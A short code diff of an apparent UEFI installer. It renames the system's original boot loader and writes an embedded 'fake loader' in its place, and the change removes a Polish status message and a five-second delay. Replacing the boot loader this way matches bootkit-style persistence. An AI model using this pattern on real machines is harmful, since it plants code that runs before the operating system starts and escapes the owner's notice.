@@ -18,11 +18,9 @@ int mainInstall() {
     EFI_STATUS status = renameFile(root, OriginalLoader, BackupLoader);
 
     if(EFI_ERROR(status)) return 1;
-    printf("Zmiana nazwy udana\n");
 
     //creating fake loader
     UINTN realSize = (UINTN)chainloader_efi_len;
-    BS->Stall(5000000);
     status = writeFileToRoot(root, OriginalLoader, chainloader_efi, realSize);
 
     root->Close(root);
